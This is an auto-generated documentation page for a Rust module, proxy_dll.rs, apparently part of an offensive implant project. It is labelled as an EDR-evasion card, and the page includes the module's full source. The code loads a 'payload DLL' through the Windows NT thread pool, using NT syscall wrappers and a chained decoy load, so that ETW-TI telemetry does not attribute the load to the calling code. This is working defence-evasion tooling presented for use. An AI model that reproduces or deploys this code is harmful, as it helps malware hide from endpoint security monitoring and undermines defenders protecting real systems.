# crowd — proxy_dll.rs  (🔥 S TIER — RecycledGate events, UAF fix, AtomicUsize)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/proxy_dll.rs` |
| **Lines** | 266 |
| **Tier** | R |
| **Cards** | T009-edr-evasion |
| **Role** | Proxy DLL loading |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 1 |

## Purpose

# crowd — proxy_dll.rs  (🔥 S TIER — RecycledGate events, UAF fix, AtomicUsize)

## Proxy DLL Loads (OPSEC 8.0)

Evades ETW-TI DLL load telemetry by loading a payload DLL through
the Windows Thread Pool mechanism instead of calling `LoadLibrary`
directly.  The call stack seen by ETW will show `ntdll!TppWorkerThread`
→ `kernel32!LoadLibraryA` rather than our code.

The technique uses:
1. `TpAllocWork` — Allocate a thread pool work item
2. A custom ASM callback that redirects to `LoadLibraryA`
3. `TpPostWork` — Submit the work item
4. `TpReleaseWork` — Cleanup

The DLL path is passed as the work item context, and the ASM callback
shuffles registers to match `LoadLibraryA(LPCSTR)` calling convention.

## Constants

- `STATUS_TIMEOUT`: `i32` = `0x102`

## Types

### struct `CallbackContext` (line 104)

## Public API

### `proxy_load_dll` (line 120)
```rust
pub fn proxy_load_dll(dll_name: &str) -> Result<usize, String>
```
Loads a DLL via the NT Thread Pool, hiding the LoadLibrary call from
ETW-TI stack walk attribution.

# Arguments
* `dll_name` — The DLL to load (e.g. "wininet.dll" or a full path)

# Returns
`Ok(handle)` — Module handle of the loaded DLL
`Err(msg)` — If resolution or thread pool setup fails

### `proxy_load_chained` (line 261)
```rust
pub fn proxy_load_chained(dll_name: &str) -> Result<usize, String>
```
Loads a payload DLL through a chain of proxy loads to further obscure
the call stack.  First loads a benign system DLL, then loads the actual
payload via the same thread pool mechanism.

## Internal Functions

- `work_callback` (unsafe) — The thread pool callback.  Called by the NT thread pool worker. (line 71)

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — proxy_dll.rs  (🔥 S TIER — RecycledGate events, UAF fix, AtomicUsize)
//!
//! ## Proxy DLL Loads (OPSEC 8.0)
//!
//! Evades ETW-TI DLL load telemetry by loading a payload DLL through
//! the Windows Thread Pool mechanism instead of calling `LoadLibrary`
//! directly.  The call stack seen by ETW will show `ntdll!TppWorkerThread`
//! → `kernel32!LoadLibraryA` rather than our code.
//!
//! The technique uses:
//! 1. `TpAllocWork` — Allocate a thread pool work item
//! 2. A custom ASM callback that redirects to `LoadLibraryA`
//! 3. `TpPostWork` — Submit the work item
//! 4. `TpReleaseWork` — Cleanup
//!
//! The DLL path is passed as the work item context, and the ASM callback
//! shuffles registers to match `LoadLibraryA(LPCSTR)` calling convention.

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
#[allow(unused_imports)]
use crate::mega_dbg;

// ── Types ─────────────────────────────────────────────────────────────────

type TpAllocWorkFn = unsafe extern "system" fn(
    *mut usize,                      // WorkReturn
    TpWorkCallback,                  // Callback
    *mut c_void,                     // Context
    *mut c_void,                     // CallbackEnviron (NULL)
) -> i32;

type TpPostWorkFn = unsafe extern "system" fn(usize);
type TpReleaseWorkFn = unsafe extern "system" fn(usize);

type TpWorkCallback = unsafe extern "system" fn(
    usize,          // Instance
    *mut c_void,    // Context
    usize,          // Work
);

type LoadLibraryAFn = unsafe extern "system" fn(*const i8) -> usize;

// ── Work Callback ─────────────────────────────────────────────────────────
//
// The callback receives:
//   RCX = Instance, RDX = Context (our DLL path), R8 = Work
//
// We need to call LoadLibraryA(Context), so we:
//   1. Move RDX (Context/DLL path) into RCX (first arg for LoadLibraryA)
//   2. Call LoadLibraryA
//
// In the Tsukuyomi source this is done via global_asm!.  For crowd we use
// a safe Rust wrapper that does the same thing without inline assembly,
// making it compatible with all Rust toolchains.

use std::sync::atomic::{AtomicUsize, Ordering};

/// Address of LoadLibraryA — set before submitting work.
/// Uses AtomicUsize for thread-safe access (was: static mut — UB under concurrent access).
static P_LOAD_LIBRARY_A: AtomicUsize = AtomicUsize::new(0);

/// The thread pool callback.  Called by the NT thread pool worker.
/// `context` points to the null-terminated DLL name string.
///
/// SAFETY: The context pointer MUST remain valid until this callback fires.
/// The caller uses an NT Event to synchronize: the callback signals the event
/// after LoadLibraryA completes, ensuring the context buffer isn't freed early.
unsafe extern "system" fn work_callback(
    _instance: usize,
    context: *mut c_void,
    _work: usize,
) {
    if context.is_null() {
        return;
    }

    // Context layout: [*const i8 dll_name_ptr][HANDLE event_handle]
    // We packed both into a heap-allocated CallbackContext struct.
    let ctx = &*(context as *const CallbackContext);

    let load_lib_addr = P_LOAD_LIBRARY_A.load(Ordering::Acquire);
    if load_lib_addr == 0 {
        // Signal event even on failure so caller doesn't hang
        if ctx.event != 0 {
            crate::recycled::nt_set_event(ctx.event, null_mut());
        }
        return;
    }

    let load_lib: LoadLibraryAFn = std::mem::transmute(load_lib_addr);
    load_lib(ctx.dll_name.as_ptr() as *const i8);

    // Signal completion event via NtSetEvent (RecycledGate)
    if ctx.event != 0 {
        crate::recycled::nt_set_event(ctx.event, null_mut());
    }
}

/// Heap-allocated callback context. Lives until the event is signaled.
#[repr(C)]
struct CallbackContext {
    dll_name: Vec<u8>,   // Owned null-terminated DLL name (heap — survives stack frame)
    event: usize,        // NT Event handle for synchronization
}

// ── Public API ────────────────────────────────────────────────────────────

/// Loads a DLL via the NT Thread Pool, hiding the LoadLibrary call from
/// ETW-TI stack walk attribution.
///
/// # Arguments
/// * `dll_name` — The DLL to load (e.g. "wininet.dll" or a full path)
///
/// # Returns
/// `Ok(handle)` — Module handle of the loaded DLL
/// `Err(msg)` — If resolution or thread pool setup fails
pub fn proxy_load_dll(dll_name: &str) -> Result<usize, String> {
    mega_dbg!("ProxyDLL: loading '{}' via TpAllocWork/TpPostWork", dll_name);

    unsafe {
        let kernel32 = winapi::um::libloaderapi::GetModuleHandleA(
            b"kernel32\0".as_ptr() as *const i8,
        );
        let ntdll = winapi::um::libloaderapi::GetModuleHandleA(
            b"ntdll\0".as_ptr() as *const i8,
        );

        if kernel32.is_null() || ntdll.is_null() {
            return Err("ProxyDLL: kernel32/ntdll not found".into());
        }

        // Resolve LoadLibraryA — thread-safe via AtomicUsize
        let lla = winapi::um::libloaderapi::GetProcAddress(
            kernel32,
            b"LoadLibraryA\0".as_ptr() as *const i8,
        ) as usize;
        if lla == 0 {
            return Err("ProxyDLL: LoadLibraryA not found".into());
        }
        P_LOAD_LIBRARY_A.store(lla, Ordering::Release);

        // Resolve TpAllocWork, TpPostWork, TpReleaseWork from ntdll
        // CRITICAL: null check each GetProcAddress — transmuting null to fn ptr is instant UB
        let tp_alloc_work_ptr = winapi::um::libloaderapi::GetProcAddress(
            ntdll, b"TpAllocWork\0".as_ptr() as *const i8,
        );
        if tp_alloc_work_ptr.is_null() {
            return Err("ProxyDLL: TpAllocWork not found in ntdll".into());
        }
        let tp_alloc_work: TpAllocWorkFn = std::mem::transmute(tp_alloc_work_ptr);

        let tp_post_work_ptr = winapi::um::libloaderapi::GetProcAddress(
            ntdll, b"TpPostWork\0".as_ptr() as *const i8,
        );
        if tp_post_work_ptr.is_null() {
            return Err("ProxyDLL: TpPostWork not found in ntdll".into());
        }
        let tp_post_work: TpPostWorkFn = std::mem::transmute(tp_post_work_ptr);

        let tp_release_work_ptr = winapi::um::libloaderapi::GetProcAddress(
            ntdll, b"TpReleaseWork\0".as_ptr() as *const i8,
        );
        if tp_release_work_ptr.is_null() {
            return Err("ProxyDLL: TpReleaseWork not found in ntdll".into());
        }
        let tp_release_work: TpReleaseWorkFn = std::mem::transmute(tp_release_work_ptr);

        // NtCreateEvent via RecycledGate (no Win32 CreateEvent)
        // event_type 0 = NotificationEvent (manual reset), initial_state 0 = non-signaled
        let mut h_event: usize = 0;
        let st = crate::recycled::nt_create_event(
            &mut h_event,
            0x1F0003, // EVENT_ALL_ACCESS
            null_mut(),
            0,  // NotificationEvent (manual reset)
            0,  // initial_state = non-signaled
        );
        if st < 0 || h_event == 0 {
            return Err("ProxyDLL: NtCreateEvent failed".into());
        }

        // Heap-allocate the callback context so it survives this stack frame.
        // FIX: old code used a stack-local Vec as context pointer → use-after-free
        // if the callback fired after this function returned.
        let mut dll_cstr = dll_name.as_bytes().to_vec();
        dll_cstr.push(0);

        let ctx = Box::new(CallbackContext {
            dll_name: dll_cstr,
            event: h_event,
        });
        let ctx_ptr = Box::into_raw(ctx);  // Leak intentionally — freed after wait

        // Allocate work item with heap-allocated context
        let mut work_return: usize = 0;
        let status = tp_alloc_work(
            &mut work_return,
            work_callback,
            ctx_ptr as *mut c_void,
            null_mut(),
        );

        if status != 0 {
            let _ = Box::from_raw(ctx_ptr); // Reclaim on failure
            crate::recycled::nt_close(h_event);
            return Err(format!("ProxyDLL: TpAllocWork failed (0x{:08x})", status));
        }

        mega_dbg!("ProxyDLL: TpAllocWork OK — work=0x{:x}", work_return);

        // Submit work to the thread pool
        tp_post_work(work_return);

        // NtWaitForSingleObject — max 10 seconds (100ns intervals, negative = relative)
        let timeout: i64 = -10_000 * 10_000; // 10 seconds in 100ns units (negative = relative)
        let wait_status = crate::recycled::nt_wait_for_single_object(h_event, false, &timeout);

        // STATUS_TIMEOUT = 0x00000102 — callback may still be running
        const STATUS_TIMEOUT: i32 = 0x102;

        if wait_status == STATUS_TIMEOUT {
            // On timeout, the callback may still be referencing ctx_ptr.
            // We MUST NOT free ctx_ptr (leak it intentionally to prevent UAF).
            // Release the work item to prevent further scheduling, but the
            // callback context is deliberately leaked for safety.
            tp_release_work(work_return);
            crate::recycled::nt_close(h_event);
            // ctx_ptr is intentionally NOT reclaimed — the callback may still hold a reference
            mega_dbg!("ProxyDLL: wait timed out — context leaked to prevent use-after-free");
            return Err("ProxyDLL: thread pool callback timed out after 10s".into());
        }

        // Callback completed — safe to release work item and reclaim context
        tp_release_work(work_return);

        // Reclaim the heap-allocated context
        let ctx_reclaimed = Box::from_raw(ctx_ptr);
        crate::recycled::nt_close(h_event);

        // Verify the DLL was loaded
        let h_dll = winapi::um::libloaderapi::GetModuleHandleA(
            ctx_reclaimed.dll_name.as_ptr() as *const i8,
        );

        if h_dll.is_null() {
            mega_dbg!("ProxyDLL: '{}' NOT in module list after TP callback", dll_name);
            return Err(format!("ProxyDLL: '{}' failed to load", dll_name));
        }

        mega_dbg!("ProxyDLL: '{}' loaded at {:p} via thread pool proxy", dll_name, h_dll);
        Ok(h_dll as usize)
    }
}

/// Loads a payload DLL through a chain of proxy loads to further obscure
/// the call stack.  First loads a benign system DLL, then loads the actual
/// payload via the same thread pool mechanism.
pub fn proxy_load_chained(dll_name: &str) -> Result<usize, String> {
    // Load a benign DLL first to "warm" the thread pool and create noise
    let _ = proxy_load_dll("wtsapi32.dll");
    // Now load the actual target
    proxy_load_dll(dll_name)
}

```